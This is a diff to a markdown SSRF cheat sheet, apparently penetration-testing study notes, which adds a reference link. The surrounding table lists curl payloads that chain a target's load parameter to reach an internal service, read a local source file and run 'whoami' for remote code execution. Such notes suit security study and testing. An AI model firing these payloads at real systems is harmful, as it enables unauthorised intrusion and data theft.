@@ -35,7 +35,7 @@
 | `curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///app/internal_local.py"` |  Retrieving a local file through the target application  |
 | `curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=whoami"` | Confirming remote code exeuction on the remote host |
 | `sudo apt-get install jq` | Installing jq| 
-
+| `https://highon.coffee/blog/ssrf-cheat-sheet/`| Useful link|
 
 ## Blind SSRF Exploitation Example
 
